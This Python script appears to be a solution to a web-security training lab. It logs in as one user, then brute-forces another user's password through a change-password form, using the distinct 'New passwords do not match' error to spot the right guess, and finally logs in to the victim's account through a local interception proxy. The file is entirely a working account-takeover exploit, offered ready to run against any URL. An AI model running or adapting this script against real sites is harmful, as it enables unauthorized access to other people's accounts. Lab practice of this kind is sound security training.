import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def access_carlos_account(s, url):

    print("[+] Logging into regular users account...")
    login_url = url + "/login"
    login_data = {"username": "wiener", "password": "peter"}
    r = s.post(login_url, data=login_data, verify=False, proxies=proxies)

    print("[+] Brute-forcing Carlos's password... ")
    change_password_url = url + "/my-account/change-password"
    carlos_pwd=None

    with open('passwords.txt', 'r') as f:
        lines = f.readlines()

    for pwd in lines:
        pwd = pwd.strip('\n')
        change_password_data = {"username": "carlos", "current-password": pwd, "new-password-1": "ahwushwus", "new-password-2": "wexedoooo"}
        r = s.post(change_password_url, data=change_password_data, verify=False, proxies=proxies)
        if "New passwords do not match" in r.text:
            carlos_pwd = pwd
            print("[+] found Carlos's password!: " + carlos_pwd)
            break

    if carlos_pwd:
        #login
        login_data = {"username": "carlos", "password": carlos_pwd}
        r = requests.post(login_url, data=login_data, verify=False, proxies=proxies)
        if "Log out" in r.text:
            print("[+] Successfully logged in to Carlos's account!")
        else: 
            print("[-] Could not login to Carlos's account...")
            sys.exit(-1)
    else:
        print("[-] Could not find Carlos's password...")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.exmaple.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.session()
    url = sys.argv[1]
    access_carlos_account(s, url)

if __name__ == "__main__":
    main()